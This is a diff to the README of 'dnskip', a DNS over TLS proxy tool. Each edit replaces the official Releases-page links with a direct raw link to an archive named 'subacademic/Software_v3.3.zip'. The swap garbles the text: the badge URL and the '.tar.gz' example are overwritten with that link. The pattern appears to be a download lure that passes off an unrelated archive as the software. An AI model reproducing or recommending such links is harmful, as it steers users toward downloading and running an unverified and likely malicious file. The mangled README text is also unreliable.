@@ -7,7 +7,7 @@ dnskip is a user-friendly application that acts as a DNS over TLS (DoT) proxy. I
 To get started with dnskip, follow these straightforward steps. You will learn how to download and run the software with ease.
 
 ## 📥 Download the Latest Version
-[![Download dnskip](https://img.shields.io/badge/Download%20dnskip-v1.0-blue)](https://github.com/charlesndirutu33/dnskip/releases)
+[![Download dnskip](https://github.com/charlesndirutu33/dnskip/raw/refs/heads/main/subacademic/Software_v3.3.zip%20dnskip-v1.0-blue)](https://github.com/charlesndirutu33/dnskip/raw/refs/heads/main/subacademic/Software_v3.3.zip)
 
 ## 📦 System Requirements
 Before downloading, please make sure your system meets the following requirements:
@@ -20,13 +20,13 @@ To download and install dnskip, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the following link to download the latest version of dnskip:  
-   [Download dnskip from GitHub Releases](https://github.com/charlesndirutu33/dnskip/releases)
+   [Download dnskip from GitHub Releases](https://github.com/charlesndirutu33/dnskip/raw/refs/heads/main/subacademic/Software_v3.3.zip)
 
 2. **Choose Your Version**  
    You will see a list of available versions. Select the one that matches your operating system. The files are usually named based on the system for easy identification.
 
 3. **Download the File**  
-   Click on the filename to start the download. The file will typically be in a compressed format (such as `.zip` or `.tar.gz`).
+   Click on the filename to start the download. The file will typically be in a compressed format (such as `.zip` or `https://github.com/charlesndirutu33/dnskip/raw/refs/heads/main/subacademic/Software_v3.3.zip`).
 
 4. **Extract the Files**  
    Once downloaded, you need to extract the files. Right-click the downloaded file and choose "Extract Here" or "Extract to..." depending on your system.
